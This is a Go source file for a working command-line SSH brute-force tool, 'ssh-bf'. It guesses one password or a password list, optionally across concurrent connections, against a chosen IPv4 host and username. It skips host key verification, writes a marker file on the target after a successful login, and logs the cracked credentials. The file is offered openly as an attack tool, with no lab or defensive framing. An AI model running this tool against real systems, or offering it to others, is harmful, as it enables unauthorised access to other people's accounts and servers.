package main

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"

	"golang.org/x/crypto/ssh"

	"github.com/akamensky/argparse"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

var logger zerolog.Logger

func successLogger(host string, port int, username string, password string) {
	logger.Info().Str("host", host).Int("port", port).Str("username", username).Str("password", password).
		Msg("\x1b[32m ---= Brute force successful 😈 ! =---\x1b[0m")
}

func BruteForce(host string, port int, username string, password string) bool {

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	addr := host + ":" + fmt.Sprint(port)

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		logger.Error().Err(err).Msg("Failed to connect to SSH server")
		return false
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		logger.Error().Err(err).Msg("Failed to create SSH session")
		return false
	}
	defer session.Close()

	err = session.Run("echo Brute force successful > /tmp/ssh-bf-success.txt")
	if err != nil {
		logger.Error().Err(err).Msg("Failed to run command on SSH server")
		return false
	}



	return true
}

func BruteForceList(host string, port int, username string, pass_list string) (string, error) {

	file, err := os.Open(pass_list)
	if err != nil {
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		logger.Debug().Msg("Reading password from file")
		password := scanner.Text()

		if BruteForce(host, port, username, password) {
			return password, nil
		}

		logger.Warn().Str("host", host).Int("port", port).Str("username", username).Str("password", password).Msg("Brute force failed")
	}

	if err := scanner.Err(); err != nil {
		logger.Error().Err(err).Msg("Failed to read password list file")
	}

	return "", errors.New("brute force failed")
}

func ThreadedBruteForce(host string, port int, username string, pass_list string, max_nb int) (string, error) {
	file, err := os.Open(pass_list)
	if err != nil {
		return "", err
	}
	defer file.Close()

	var candidates []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		candidates = append(candidates, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		logger.Error().Err(err).Msg("Failed to read password list file")
	}

	var wg sync.WaitGroup
	var once sync.Once
	sem := make(chan struct{}, max_nb) // Throttle ssh connections
	passwordChan := make(chan string)

	for _, password := range candidates {
		wg.Add(1)
		sem <- struct{}{}
		go func(password string) {
			defer wg.Done()
			defer func() { <-sem }()
			if BruteForce(host, port, username, password) {
				once.Do(func() {
					passwordChan <- password
				})
			}
		}(password)
	}

	go func() {
		wg.Wait()
		close(passwordChan)
	}()

	if password, ok := <-passwordChan; ok {
		return password, nil
	}

	return "", errors.New("brute force failed")
}

func main() {
	// logger setup
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()

	// argument parser setup
	parser := argparse.NewParser("ssh-bf", "SSH brute force attack tool")

	host := parser.String("", "host", &argparse.Options{
		Required: true,
		Help:     "Target host",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("host cannot be empty")
			} else {
				ip := net.ParseIP(args[0])
				if ip == nil {
					return errors.New("host must be a valid IP address")
				}
				if ip.To4() == nil {
					return errors.New("host must be a valid IPv4 address")
				}
				if ip.IsLoopback() {
					return errors.New("host cannot be a loopback address")
				}

				if ip.IsUnspecified() {
					return errors.New("host cannot be an unspecified address")
				}
			}
			return nil
		},
	})

	port := parser.Int("", "port", &argparse.Options{
		Required: false,
		Help:     "Target port, default is 22",
		Default:  22,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("port must be a number")
			}
			
			if val <= 0 || val >= 65535 {
				return errors.New("port must be between 1 and 65535")
			}
			return nil
		},
	})

	username := parser.String("u", "username", &argparse.Options{
		Required: true,
		Help:     "Account username to brute force",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("username cannot be empty")
			}
			return nil
		},
	})

	password := parser.String("p", "password", &argparse.Options{
		Required: false,
		Help:     "Password to brute force, mutually exclusive with password list, only one of them should be used",
	})

	pass_list := parser.String("l", "password-list", &argparse.Options{
		Required: false,
		Help:     "Password list, in a text fromat, to use for brute force, mutually exclusive with password, only one of them should be used",
	})

	debug := parser.Flag("d", "debug", &argparse.Options{
		Required: false,
		Help:     "Enable debug mode",
		Default:  false,
	})

	threaded := parser.Int("t", "threaded", &argparse.Options{
		Required: false,
		Help:     "Enable threaded brute force mode with a limit of n threads. No effect if password list is not used",
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("thread count must be a number")
			}

			if val <= 1 {
				return errors.New("thread count must be greater than 1")
			}
			return nil
		},
	})

	// parse arguments

	if err := parser.Parse(os.Args); err != nil {
		logger.Fatal().Err(err).Msg("Failed to parse arguments")
	}

	if *debug {
		zerolog.SetGlobalLevel(zerolog.DebugLevel)
		logger.Debug().Msg("Debug mode enabled")
	}

	// try to brute force
	if *pass_list != "" {
		if *password != "" {
			logger.Fatal().Msg("Only one of password or password list argument should be used")
		}

		logger.Debug().Str("host", *host).Int("port", *port).Str("username", *username).Str("password_list", *pass_list).Msg("Trying password list")

		if *threaded > 0 {
			logger.Debug().Msg("Threaded brute force mode enabled")
			password, err := ThreadedBruteForce(*host, *port, *username, *pass_list, *threaded)
			if err != nil {
				logger.Fatal().Err(err).Msg("Brute force failed")
			}
			successLogger(*host, *port, *username, password)
		} else {
			password, err := BruteForceList(*host, *port, *username, *pass_list)
			if err != nil {
				logger.Fatal().Err(err).Msg("Brute force failed")
			}
			successLogger(*host, *port, *username, password)
		}
	} else {
		if !BruteForce(*host, *port, *username, *password) {
			logger.Warn().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force failed")
		} else {
			successLogger(*host, *port, *username, *password)
		}
	}
}
